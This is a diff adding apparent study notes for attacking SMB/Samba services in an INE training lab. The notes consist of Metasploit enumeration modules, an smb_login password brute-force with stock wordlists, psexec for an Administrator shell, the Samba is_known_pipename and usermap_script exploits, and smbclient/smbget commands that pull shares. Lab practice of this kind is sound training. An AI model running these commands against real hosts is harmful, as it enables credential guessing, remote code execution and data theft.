@@ -1,0 +1,56 @@
+msfconsole
+
+workspace -a smb_enum
+
+setg RHOSTS
+
+auxiliary/scanner/smb/smb_version
+
+auxiliary/scanner/smb/smb_enumusers
+
+auxiliary/scanner/smb/smb_enumshares           
+set ShowFiles true
+
+auxiliary/scanner/smb/smb_login 
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS demo.ine.local
+set VERBOSE false
+exploit
+
+
+pse
+psexec.py Administrator@192.168.100.55 cmd.exe
+
+
+exploit/windows/smb/psexec
+set SMBUser
+set SMBPass
+set PAYLOAD
+
+
+msfconsole -q
+use exploit/linux/samba/is_known_pipename
+set RHOST demo.ine.local
+check
+exploit
+id
+
+exploit/multi/samba/usermap_script
+
+
+enum4linux -a <ip> -u admin -p password
+
+
+
+smbclient -L \\10.10.203.176 
+smbclient \\\\10.10.203.176\\anonymous
+smbclient \\\\10.10.203.176\\ -U admin 
+smbclient \\\\10.10.203.176\\public -U admin 
+smbclient \\\\10.10.203.176\\aisha -U admin 
+smbclient //10.10.173.106/anonymous
+smbget -R smb://10.10.173.106/anonymous
+smbmap -H 10.10.38.7
+smbclient -L //target2.ine.local -U administrator
+
+
